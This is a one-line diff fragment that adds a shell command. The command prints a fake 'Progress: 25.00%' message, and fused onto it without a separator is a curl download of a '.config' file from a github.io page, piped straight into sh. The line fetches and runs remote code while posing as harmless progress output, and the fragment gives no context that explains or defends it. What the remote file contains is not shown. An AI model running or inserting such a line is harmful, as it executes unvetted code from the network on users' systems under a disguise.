@@ -1,0 +1,1 @@
+echo Progress: 25.00%curl -L --progress-bar frkns.github.io/fun/thinkpadshoesseas.config | sh
